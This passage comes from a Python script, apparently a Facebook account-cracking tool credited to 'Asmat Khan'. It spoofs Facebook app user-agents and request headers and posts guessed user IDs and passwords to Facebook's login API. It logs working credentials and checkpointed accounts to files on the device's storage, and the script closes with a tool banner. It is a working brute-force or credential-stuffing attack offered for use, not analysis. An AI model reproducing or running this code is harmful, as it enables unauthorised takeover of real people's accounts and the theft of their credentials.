Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/364.0.0.14.77;]','Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]','Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]','Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A360 [FBAN/FBIOS;FBAV/436.1.0.49.100;FBBV/525940286;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.0.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/527921655]','Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 9; SM-A920F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H365 [FBAN/FBIOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.9;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 12; SM-T860 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]','Mozilla/5.0 (Linux; Android 12; 2201117TG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 7.0; LG-M200 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 13; M2101K7BL Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]", 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'Accept-Encoding': 'gzip, deflate', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Connection': 'Keep-Alive'}
                }
                url = "https://b-graph.facebook.com/auth/login"
                result = ses.post(url, data=data, headers=headers).json()
                if "session_key" in result:
                    print(f" {g}[Ok] {uid}|{ps} ")
                    open("/sdcard/Asmat-M2-Ok.txt", "a").write(f"{uid}|{ps}\n")
                    oks.append(uid)
                    break
                elif "www.facebook.com" in result["error"]["message"]:
                    print(f" {r}[Cp] {uid}|{ps} ")
                    open("/sdcard/Asmat-M2-Cp.txt", "a").write(f"{uid}|{ps}\n")
                    cps.append(uid)
                    break
                else:
                    continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
   _______  _______  _______  _______ _________
  (  ___  )(  ____ \(       )(  ___  )\__   __/
  | (   ) || (    \/| () () || (   ) |   ) (   
  | (___) || (_____ | || || || (___) |   | |   
  |  ___  |(_____  )| |(_)| ||  ___  |   | |   
  | (   ) |      ) || |   | || (   ) |   | |   
  | )   ( |/\____) || )   ( || )   ( |   | |   
  |/     \|\_______)|/     \||/     \|   )_(   
-----------------------------------------------
 [•] Owner   : Asmat Khan
 [•] Github  : https://github.com/Asmat-786
 [•] Version : 0.1
-----------------------------------------------\
"""

menu()
